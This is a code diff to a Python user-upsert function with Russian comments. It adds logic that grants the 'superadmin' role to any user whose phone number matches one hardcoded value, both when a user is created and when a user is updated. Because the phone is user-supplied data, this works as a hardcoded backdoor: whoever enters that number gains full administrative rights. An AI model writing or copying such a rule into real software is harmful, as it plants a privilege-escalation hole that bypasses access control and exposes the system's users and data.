@@ -271,6 +271,15 @@ def upsert_user(data: dict):
             update_fields.append("is_active = ?")
             update_values.append(1)
         
+        # Если роль не указана в data, но пользователь обновляет телефон - проверяем роль по телефону
+        if "role" not in data and "phone" in data:
+            import re
+            phone_clean = re.sub(r'\D', '', str(data["phone"]))
+            if phone_clean == "79207455960" and user_dict.get("role") != "superadmin":
+                # Обновляем роль на superadmin, если телефон соответствует
+                update_fields.append("role = ?")
+                update_values.append("superadmin")
+        
         if update_fields:
             update_values.append(user_id)
             query = f"UPDATE users SET {', '.join(update_fields)} WHERE id = ?"
@@ -290,6 +299,13 @@ def upsert_user(data: dict):
         is_active = data.get("is_active", 1)
         tg_username = data.get("tg_username", "")
         first_name = data.get("first_name", full_name)
+        
+        # Если роль не указана, определяем по телефону (суперадмин)
+        if role == "user" and phone:
+            import re
+            phone_clean = re.sub(r'\D', '', str(phone))
+            if phone_clean == "79207455960":
+                role = "superadmin"
         
         try:
             cur.execute(
